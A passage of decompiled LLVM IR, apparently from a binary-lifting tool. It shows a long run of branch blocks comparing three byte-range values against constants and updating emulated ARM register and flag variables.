  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f948

bb1736:                                           ; preds = %bb1735
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f940 = icmp eq i32 %v0_f940.pr, 0
  store i1 %v2_f940, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f940, label %dec_label_pc_f948, label %dec_label_pc_e8d0

dec_label_pc_f948:                                ; preds = %.thread394, %.thread390, %bb1736, %.thread389
  store i32 %.2028, i32* %r3.global-to-local, align 4
  %v2_f94c = icmp ugt i32 %v1_e8e8, 150
  store i1 %v2_f94c, i1* %cpsr_c.global-to-local, align 1
  %v7_f94c = icmp eq i32 %v1_e8e8, 151
  store i1 %v7_f94c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f94c, label %.thread397, label %.thread398

.thread398:                                       ; preds = %dec_label_pc_f948
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f97c

.thread397:                                       ; preds = %dec_label_pc_f948
  store i32 %.2028, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f958 = icmp eq i1 %v7_f7bc, false
  store i1 %v2_f958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f958, label %dec_label_pc_f97c, label %dec_label_pc_f960

dec_label_pc_f960:                                ; preds = %.thread397
  %v2_f960 = icmp ugt i32 %v1_e8ec, 135
  store i1 %v2_f960, i1* %cpsr_c.global-to-local, align 1
  %v7_f960 = icmp eq i32 %v1_e8ec, 136
  store i1 %v7_f960, i1* %cpsr_z.global-to-local, align 1
  %v2_f964 = xor i1 %v2_f960, true
  %v3_f964 = or i1 %v7_f960, %v2_f964
  br i1 %v3_f964, label %bb1737, label %bb1738

bb1737:                                           ; preds = %dec_label_pc_f960
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1738

bb1738:                                           ; preds = %dec_label_pc_f960, %bb1737
  %v0_f974.pr966 = phi i32 [ %.2028, %dec_label_pc_f960 ], [ 0, %bb1737 ]
  %v2_f968 = xor i1 %v7_f960, true
  %v3_f968 = and i1 %v2_f960, %v2_f968
  br i1 %v3_f968, label %bb1739, label %bb1740

bb1739:                                           ; preds = %bb1738
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1740

bb1740:                                           ; preds = %bb1738, %bb1739
  %v0_f974.pr = phi i32 [ %v0_f974.pr966, %bb1738 ], [ 1, %bb1739 ]
  %v2_f96c = icmp ugt i32 %v1_e8ec, 137
  store i1 %v2_f96c, i1* %cpsr_c.global-to-local, align 1
  %v7_f96c = icmp eq i32 %v1_e8ec, 138
  store i1 %v7_f96c, i1* %cpsr_z.global-to-local, align 1
  %v2_f970 = xor i1 %v7_f96c, true
  %v3_f970 = and i1 %v2_f96c, %v2_f970
  br i1 %v3_f970, label %.thread402, label %bb1741

.thread402:                                       ; preds = %bb1740
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f97c

bb1741:                                           ; preds = %bb1740
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f974 = icmp eq i32 %v0_f974.pr, 0
  store i1 %v2_f974, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f974, label %dec_label_pc_f97c, label %dec_label_pc_e8d0

dec_label_pc_f97c:                                ; preds = %.thread402, %.thread398, %bb1741, %.thread397
  store i32 %.2001, i32* %r3.global-to-local, align 4
  %v2_f980 = icmp ugt i32 %v1_e8e8, 93
  store i1 %v2_f980, i1* %cpsr_c.global-to-local, align 1
  %v7_f980 = icmp eq i32 %v1_e8e8, 94
  store i1 %v7_f980, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f980, label %.thread405, label %.thread406

.thread406:                                       ; preds = %dec_label_pc_f97c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f9a0

.thread405:                                       ; preds = %dec_label_pc_f97c
  store i32 %.2001, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f98c = icmp eq i1 %v7_ed30, false
  store i1 %v2_f98c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f98c, label %dec_label_pc_f9a0, label %dec_label_pc_f994

dec_label_pc_f994:                                ; preds = %.thread405
  %v2_f994 = icmp eq i32 %v1_e8ec, 255
  store i1 %v2_f994, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f994, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f994, label %dec_label_pc_f9a0, label %bb1742

bb1742:                                           ; preds = %dec_label_pc_f994
  %v3_f998 = icmp ugt i32 %v1_e8ec, 235
  store i1 %v3_f998, i1* %cpsr_c.global-to-local, align 1
  %v8_f998 = icmp eq i32 %v1_e8ec, 236
  store i1 %v8_f998, i1* %cpsr_z.global-to-local, align 1
  %v2_f99c = xor i1 %v8_f998, true
  %v3_f99c = and i1 %v3_f998, %v2_f99c
  br i1 %v3_f99c, label %dec_label_pc_e8d0, label %dec_label_pc_f9a0

dec_label_pc_f9a0:                                ; preds = %dec_label_pc_f994, %.thread406, %bb1742, %.thread405
  %v0_f9c0.pr972 = phi i32 [ 0, %.thread406 ], [ %.2001, %bb1742 ], [ 0, %.thread405 ], [ %.2001, %dec_label_pc_f994 ]
  %v2_f9a0 = icmp ugt i32 %v1_e8d4, 62
  store i1 %v2_f9a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f9a0 = icmp eq i32 %v1_e8d4, 63
  store i1 %v7_f9a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9a0, label %bb1743, label %dec_label_pc_f9c8

bb1743:                                           ; preds = %dec_label_pc_f9a0
  store i1 %v2_f29c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f29c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f29c, label %dec_label_pc_f9ac, label %dec_label_pc_f9c8

dec_label_pc_f9ac:                                ; preds = %bb1743
  %v2_f9ac = icmp ugt i32 %v1_e8ec, 17
  store i1 %v2_f9ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f9ac = icmp eq i32 %v1_e8ec, 18
  store i1 %v7_f9ac, i1* %cpsr_z.global-to-local, align 1
  %v2_f9b0 = xor i1 %v2_f9ac, true
  %v3_f9b0 = or i1 %v7_f9ac, %v2_f9b0
  br i1 %v3_f9b0, label %bb1744, label %bb1745

bb1744:                                           ; preds = %dec_label_pc_f9ac
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1745

bb1745:                                           ; preds = %dec_label_pc_f9ac, %bb1744
  %v0_f9c0.pr971 = phi i32 [ %v0_f9c0.pr972, %dec_label_pc_f9ac ], [ 0, %bb1744 ]
  %v2_f9b4 = xor i1 %v7_f9ac, true
  %v3_f9b4 = and i1 %v2_f9ac, %v2_f9b4
  br i1 %v3_f9b4, label %bb1746, label %bb1747

bb1746:                                           ; preds = %bb1745
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1747

bb1747:                                           ; preds = %bb1745, %bb1746
  %v0_f9c0.pr = phi i32 [ %v0_f9c0.pr971, %bb1745 ], [ 1, %bb1746 ]
  %v2_f9b8 = icmp ugt i32 %v1_e8ec, 19
  store i1 %v2_f9b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f9b8 = icmp eq i32 %v1_e8ec, 20
  store i1 %v7_f9b8, i1* %cpsr_z.global-to-local, align 1
  %v2_f9bc = xor i1 %v7_f9b8, true
  %v3_f9bc = and i1 %v2_f9b8, %v2_f9bc
  br i1 %v3_f9bc, label %.thread411, label %bb1748

.thread411:                                       ; preds = %bb1747
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f9c8

bb1748:                                           ; preds = %bb1747
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9c0 = icmp eq i32 %v0_f9c0.pr, 0
  store i1 %v2_f9c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f9c0, label %dec_label_pc_f9c8, label %dec_label_pc_e8d0

dec_label_pc_f9c8:                                ; preds = %dec_label_pc_f9a0, %.thread411, %bb1748, %bb1743
  %v0_f9e8.pr975 = phi i32 [ %v0_f9c0.pr972, %dec_label_pc_f9a0 ], [ 0, %.thread411 ], [ 0, %bb1748 ], [ %v0_f9c0.pr972, %bb1743 ]
  %v2_f9c8 = icmp ugt i32 %v1_e8d4, 69
  store i1 %v2_f9c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f9c8 = icmp eq i32 %v1_e8d4, 70
  store i1 %v7_f9c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9c8, label %bb1749, label %dec_label_pc_f9f0

bb1749:                                           ; preds = %dec_label_pc_f9c8
  %v3_f9cc = icmp ugt i32 %v1_e8e8, 41
  store i1 %v3_f9cc, i1* %cpsr_c.global-to-local, align 1
  %v8_f9cc = icmp eq i32 %v1_e8e8, 42
  store i1 %v8_f9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f9cc, label %dec_label_pc_f9d4, label %dec_label_pc_f9f0

dec_label_pc_f9d4:                                ; preds = %bb1749
  %v2_f9d4 = icmp ugt i32 %v1_e8ec, 71
  store i1 %v2_f9d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f9d4 = icmp eq i32 %v1_e8ec, 72
  store i1 %v7_f9d4, i1* %cpsr_z.global-to-local, align 1
  %v2_f9d8 = xor i1 %v2_f9d4, true
  %v3_f9d8 = or i1 %v7_f9d4, %v2_f9d8
  br i1 %v3_f9d8, label %bb1750, label %bb1751

bb1750:                                           ; preds = %dec_label_pc_f9d4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1751

bb1751:                                           ; preds = %dec_label_pc_f9d4, %bb1750
  %v0_f9e8.pr974 = phi i32 [ %v0_f9e8.pr975, %dec_label_pc_f9d4 ], [ 0, %bb1750 ]
  %v2_f9dc = xor i1 %v7_f9d4, true
  %v3_f9dc = and i1 %v2_f9d4, %v2_f9dc
  br i1 %v3_f9dc, label %bb1752, label %bb1753

bb1752:                                           ; preds = %bb1751
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1753

bb1753:                                           ; preds = %bb1751, %bb1752
  %v0_f9e8.pr = phi i32 [ %v0_f9e8.pr974, %bb1751 ], [ 1, %bb1752 ]
  %v2_f9e0 = icmp ugt i32 %v1_e8ec, 73
  store i1 %v2_f9e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f9e0 = icmp eq i32 %v1_e8ec, 74
  store i1 %v7_f9e0, i1* %cpsr_z.global-to-local, align 1
  %v2_f9e4 = xor i1 %v7_f9e0, true
  %v3_f9e4 = and i1 %v2_f9e0, %v2_f9e4
  br i1 %v3_f9e4, label %.thread416, label %bb1754

.thread416:                                       ; preds = %bb1753
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f9f0

bb1754:                                           ; preds = %bb1753
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9e8 = icmp eq i32 %v0_f9e8.pr, 0
  store i1 %v2_f9e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f9e8, label %dec_label_pc_f9f0, label %dec_label_pc_e8d0

dec_label_pc_f9f0:                                ; preds = %dec_label_pc_f9c8, %.thread416, %bb1754, %bb1749
  %v0_fa1c.pr978 = phi i32 [ %v0_f9e8.pr975, %dec_label_pc_f9c8 ], [ 0, %.thread416 ], [ 0, %bb1754 ], [ %v0_f9e8.pr975, %bb1749 ]
  %v7_f9f0 = icmp eq i32 %v1_e8d4, 74
  %.2030 = zext i1 %v7_f9f0 to i32
  %v2_f9fc = icmp ugt i32 %v1_e8e8, 90
  store i1 %v2_f9fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f9fc = icmp eq i32 %v1_e8e8, 91
  store i1 %v7_f9fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9fc, label %bb1757, label %dec_label_pc_fa24

bb1757:                                           ; preds = %dec_label_pc_f9f0
  %v2_f9f0 = icmp ugt i32 %v1_e8d4, 73
  store i1 %v2_f9f0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f9f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9f0, label %dec_label_pc_fa08, label %dec_label_pc_fa24

dec_label_pc_fa08:                                ; preds = %bb1757
  %v2_fa08 = icmp ugt i32 %v1_e8ec, 111
  store i1 %v2_fa08, i1* %cpsr_c.global-to-local, align 1
  %v7_fa08 = icmp eq i32 %v1_e8ec, 112
  store i1 %v7_fa08, i1* %cpsr_z.global-to-local, align 1
  %v2_fa0c = xor i1 %v2_fa08, true
  %v3_fa0c = or i1 %v7_fa08, %v2_fa0c
  br i1 %v3_fa0c, label %bb1758, label %bb1759

bb1758:                                           ; preds = %dec_label_pc_fa08
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1759

bb1759:                                           ; preds = %dec_label_pc_fa08, %bb1758
  %v0_fa1c.pr977 = phi i32 [ %v0_fa1c.pr978, %dec_label_pc_fa08 ], [ 0, %bb1758 ]
  %v2_fa10 = xor i1 %v7_fa08, true
  %v3_fa10 = and i1 %v2_fa08, %v2_fa10
  br i1 %v3_fa10, label %bb1760, label %bb1761

bb1760:                                           ; preds = %bb1759
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1761

bb1761:                                           ; preds = %bb1759, %bb1760
  %v0_fa1c.pr = phi i32 [ %v0_fa1c.pr977, %bb1759 ], [ 1, %bb1760 ]
  %v2_fa14 = icmp ugt i32 %v1_e8ec, 113
  store i1 %v2_fa14, i1* %cpsr_c.global-to-local, align 1
  %v7_fa14 = icmp eq i32 %v1_e8ec, 114
  store i1 %v7_fa14, i1* %cpsr_z.global-to-local, align 1
  %v2_fa18 = xor i1 %v7_fa14, true
  %v3_fa18 = and i1 %v2_fa14, %v2_fa18
  br i1 %v3_fa18, label %.thread422, label %bb1762

.thread422:                                       ; preds = %bb1761
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fa24

bb1762:                                           ; preds = %bb1761
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa1c = icmp eq i32 %v0_fa1c.pr, 0
  store i1 %v2_fa1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa1c, label %dec_label_pc_fa24, label %dec_label_pc_e8d0

dec_label_pc_fa24:                                ; preds = %dec_label_pc_f9f0, %.thread422, %bb1762, %bb1757
  %v2_fa24 = icmp ugt i32 %v1_e8e8, 200
  store i1 %v2_fa24, i1* %cpsr_c.global-to-local, align 1
  %v7_fa24 = icmp eq i32 %v1_e8e8, 201
  store i1 %v7_fa24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa24, label %.thread425, label %.thread426

.thread426:                                       ; preds = %dec_label_pc_fa24
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fa54

.thread425:                                       ; preds = %dec_label_pc_fa24
  store i32 %.2030, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa30 = icmp eq i1 %v7_f9f0, false
  store i1 %v2_fa30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa30, label %dec_label_pc_fa54, label %dec_label_pc_fa38

dec_label_pc_fa38:                                ; preds = %.thread425
  %v2_fa38 = icmp ugt i32 %v1_e8ec, 54
  store i1 %v2_fa38, i1* %cpsr_c.global-to-local, align 1
  %v7_fa38 = icmp eq i32 %v1_e8ec, 55
  store i1 %v7_fa38, i1* %cpsr_z.global-to-local, align 1
  %v2_fa3c = xor i1 %v2_fa38, true
  %v3_fa3c = or i1 %v7_fa38, %v2_fa3c
  br i1 %v3_fa3c, label %bb1763, label %bb1764

bb1763:                                           ; preds = %dec_label_pc_fa38
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1764

bb1764:                                           ; preds = %dec_label_pc_fa38, %bb1763
  %v0_fa4c.pr981 = phi i32 [ %.2030, %dec_label_pc_fa38 ], [ 0, %bb1763 ]
  %v2_fa40 = xor i1 %v7_fa38, true
  %v3_fa40 = and i1 %v2_fa38, %v2_fa40
  br i1 %v3_fa40, label %bb1765, label %bb1766

bb1765:                                           ; preds = %bb1764
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1766

bb1766:                                           ; preds = %bb1764, %bb1765
  %v0_fa4c.pr = phi i32 [ %v0_fa4c.pr981, %bb1764 ], [ 1, %bb1765 ]
  %v2_fa44 = icmp ugt i32 %v1_e8ec, 56
  store i1 %v2_fa44, i1* %cpsr_c.global-to-local, align 1
  %v7_fa44 = icmp eq i32 %v1_e8ec, 57
  store i1 %v7_fa44, i1* %cpsr_z.global-to-local, align 1
  %v2_fa48 = xor i1 %v7_fa44, true
  %v3_fa48 = and i1 %v2_fa44, %v2_fa48
  br i1 %v3_fa48, label %.thread430, label %bb1767

.thread430:                                       ; preds = %bb1766
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fa54

bb1767:                                           ; preds = %bb1766
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa4c = icmp eq i32 %v0_fa4c.pr, 0
  store i1 %v2_fa4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa4c, label %dec_label_pc_fa54, label %dec_label_pc_e8d0

dec_label_pc_fa54:                                ; preds = %.thread430, %.thread426, %bb1767, %.thread425
  %v2_fa58 = icmp ugt i32 %v1_e8e8, 208
  store i1 %v2_fa58, i1* %cpsr_c.global-to-local, align 1
  %v7_fa58 = icmp eq i32 %v1_e8e8, 209
  %.2031 = zext i1 %v7_fa58 to i32
  store i32 %.2031, i32* %r4.global-to-local, align 4
  %v2_fa64 = and i32 %.2031, %.2018
  %v4_fa64 = icmp eq i32 %v2_fa64, 0
  store i1 %v4_fa64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fa64, label %dec_label_pc_fa88, label %dec_label_pc_fa6c

dec_label_pc_fa6c:                                ; preds = %dec_label_pc_fa54
  %v2_fa6c = icmp ugt i32 %v1_e8ec, 46
  store i1 %v2_fa6c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa6c = icmp eq i32 %v1_e8ec, 47
  store i1 %v7_fa6c, i1* %cpsr_z.global-to-local, align 1
  %v2_fa70 = xor i1 %v2_fa6c, true
  %v3_fa70 = or i1 %v7_fa6c, %v2_fa70
  br i1 %v3_fa70, label %bb1770, label %bb1771

bb1770:                                           ; preds = %dec_label_pc_fa6c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1771

bb1771:                                           ; preds = %dec_label_pc_fa6c, %bb1770
  %v2_fa74 = xor i1 %v7_fa6c, true
  %v3_fa74 = and i1 %v2_fa6c, %v2_fa74
  br i1 %v3_fa74, label %bb1772, label %bb1773

bb1772:                                           ; preds = %bb1771
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1773

bb1773:                                           ; preds = %bb1771, %bb1772
  %v0_fa80.pr = phi i32 [ 0, %bb1771 ], [ 1, %bb1772 ]
  %v2_fa78 = icmp ugt i32 %v1_e8ec, 51
  store i1 %v2_fa78, i1* %cpsr_c.global-to-local, align 1
  %v7_fa78 = icmp eq i32 %v1_e8ec, 52
  store i1 %v7_fa78, i1* %cpsr_z.global-to-local, align 1
  %v2_fa7c = xor i1 %v7_fa78, true
  %v3_fa7c = and i1 %v2_fa78, %v2_fa7c
  br i1 %v3_fa7c, label %.thread435, label %bb1774

.thread435:                                       ; preds = %bb1773
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fa88

bb1774:                                           ; preds = %bb1773
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa80 = icmp eq i32 %v0_fa80.pr, 0
  store i1 %v2_fa80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa80, label %dec_label_pc_fa88, label %dec_label_pc_e8d0

dec_label_pc_fa88:                                ; preds = %.thread435, %bb1774, %dec_label_pc_fa54
  store i32 %.2018, i32* %r3.global-to-local, align 4
  %v2_fa8c = icmp ugt i32 %v1_e8e8, 164
  store i1 %v2_fa8c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa8c = icmp eq i32 %v1_e8e8, 165
  store i1 %v7_fa8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa8c, label %.thread438, label %.thread439

.thread439:                                       ; preds = %dec_label_pc_fa88
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_faa0

.thread438:                                       ; preds = %dec_label_pc_fa88
  store i32 %.2018, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa98 = icmp eq i1 %v7_f34c, false
  store i1 %v2_fa98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa98, label %dec_label_pc_faa0, label %dec_label_pc_e8d0

dec_label_pc_faa0:                                ; preds = %.thread439, %.thread438
  store i32 %storemerge1217, i32* %r3.global-to-local, align 4
  %v2_faa4 = icmp ugt i32 %v1_e8d4, 148
  store i1 %v2_faa4, i1* %cpsr_c.global-to-local, align 1
  %v7_faa4 = icmp eq i32 %v1_e8d4, 149
  store i1 %v7_faa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_faa4, label %.thread442, label %.thread443

.thread443:                                       ; preds = %dec_label_pc_faa0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fab8

.thread442:                                       ; preds = %dec_label_pc_faa0
  store i32 %storemerge1217, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fab0 = icmp eq i1 %v7_eb00, false
  store i1 %v2_fab0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fab0, label %dec_label_pc_fab8, label %dec_label_pc_e8d0

dec_label_pc_fab8:                                ; preds = %.thread443, %.thread442
  %v2_fab8 = icmp ugt i32 %v1_e8d4, 150
  store i1 %v2_fab8, i1* %cpsr_c.global-to-local, align 1
  %v7_fab8 = icmp eq i32 %v1_e8d4, 151
  store i1 %v7_fab8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fab8, label %.thread446, label %.thread447

.thread447:                                       ; preds = %dec_label_pc_fab8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_facc

.thread446:                                       ; preds = %dec_label_pc_fab8
  store i32 %.1977, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fac4 = icmp eq i1 %v7_e9a8, false
  store i1 %v2_fac4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fac4, label %dec_label_pc_facc, label %dec_label_pc_e8d0

dec_label_pc_facc:                                ; preds = %.thread447, %.thread446
  store i32 %.1990, i32* %r3.global-to-local, align 4
  %v2_fad0 = icmp ugt i32 %v1_e8e8, 131
  store i1 %v2_fad0, i1* %cpsr_c.global-to-local, align 1
  %v7_fad0 = icmp eq i32 %v1_e8e8, 132
  store i1 %v7_fad0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fad0, label %.thread450, label %.thread451

.thread451:                                       ; preds = %dec_label_pc_facc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fae4

.thread450:                                       ; preds = %dec_label_pc_facc
  store i32 %.1990, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fadc = icmp eq i1 %v7_ebbc, false
  store i1 %v2_fadc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fadc, label %dec_label_pc_fae4, label %dec_label_pc_e8d0

dec_label_pc_fae4:                                ; preds = %.thread451, %.thread450
  %v2_fae4 = icmp ugt i32 %v1_e8d4, 175
  store i1 %v2_fae4, i1* %cpsr_c.global-to-local, align 1
  %v7_fae4 = icmp eq i32 %v1_e8d4, 176
  store i1 %v7_fae4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fae4, label %bb1775, label %dec_label_pc_faf0

bb1775:                                           ; preds = %dec_label_pc_fae4
  %v3_fae8 = icmp ugt i32 %v1_e8e8, 30
  store i1 %v3_fae8, i1* %cpsr_c.global-to-local, align 1
  %v8_fae8 = icmp eq i32 %v1_e8e8, 31
  store i1 %v8_fae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fae8, label %dec_label_pc_e8d0, label %dec_label_pc_faf0

dec_label_pc_faf0:                                ; preds = %dec_label_pc_fae4, %bb1775
  store i32 %.1991, i32* %r3.global-to-local, align 4
  %v2_faf8 = and i32 %.1981, %.1991
  %v4_faf8 = icmp eq i32 %v2_faf8, 0
  store i1 %v4_faf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_faf8, label %dec_label_pc_fb00, label %dec_label_pc_e8d0

dec_label_pc_fb00:                                ; preds = %dec_label_pc_faf0
  %v2_fb08 = and i32 %storemerge1219, %.2020
  %v4_fb08 = icmp eq i32 %v2_fb08, 0
  store i1 %v4_fb08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fb08, label %dec_label_pc_fb10, label %dec_label_pc_e8d0

dec_label_pc_fb10:                                ; preds = %dec_label_pc_fb00
  store i32 %.2020, i32* %r3.global-to-local, align 4
  %v2_fb14 = icmp ugt i32 %v1_e8e8, 32
  store i1 %v2_fb14, i1* %cpsr_c.global-to-local, align 1
  %v7_fb14 = icmp eq i32 %v1_e8e8, 33
  store i1 %v7_fb14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb14, label %.thread455, label %.thread456

.thread456:                                       ; preds = %dec_label_pc_fb10
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fb28

.thread455:                                       ; preds = %dec_label_pc_fb10
  store i32 %.2020, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fb20 = icmp eq i1 %v7_f3c8, false
  store i1 %v2_fb20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb20, label %dec_label_pc_fb28, label %dec_label_pc_e8d0

dec_label_pc_fb28:                                ; preds = %.thread456, %.thread455
  store i32 %.1994, i32* %r3.global-to-local, align 4
  %v2_fb2c = and i32 %.1994, %.2023
  %v4_fb2c = icmp eq i32 %v2_fb2c, 0
  store i1 %v4_fb2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fb2c, label %dec_label_pc_fb34, label %dec_label_pc_e8d0

dec_label_pc_fb34:                                ; preds = %dec_label_pc_fb28
  %v2_fb34 = icmp ugt i32 %v1_e8e8, 186
  store i1 %v2_fb34, i1* %cpsr_c.global-to-local, align 1
  %v7_fb34 = icmp eq i32 %v1_e8e8, 187
  store i1 %v7_fb34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb34, label %.thread459, label %.thread460

.thread460:                                       ; preds = %dec_label_pc_fb34
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fb48

.thread459:                                       ; preds = %dec_label_pc_fb34
  store i32 %.2023, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fb40 = icmp eq i1 %v7_f5a0, false
  store i1 %v2_fb40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb40, label %dec_label_pc_fb48, label %dec_label_pc_e8d0

dec_label_pc_fb48:                                ; preds = %.thread460, %.thread459
  %v2_fb48 = icmp ugt i32 %v1_e8d4, 45
  store i1 %v2_fb48, i1* %cpsr_c.global-to-local, align 1
  %v7_fb48 = icmp eq i32 %v1_e8d4, 46
  store i1 %v7_fb48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb48, label %bb1776, label %dec_label_pc_fb54

bb1776:                                           ; preds = %dec_label_pc_fb48
  %v3_fb4c = icmp ugt i32 %v1_e8e8, 104
  store i1 %v3_fb4c, i1* %cpsr_c.global-to-local, align 1
  %v8_fb4c = icmp eq i32 %v1_e8e8, 105
  store i1 %v8_fb4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb4c, label %dec_label_pc_e8d0, label %dec_label_pc_fb54

dec_label_pc_fb54:                                ; preds = %dec_label_pc_fb48, %bb1776
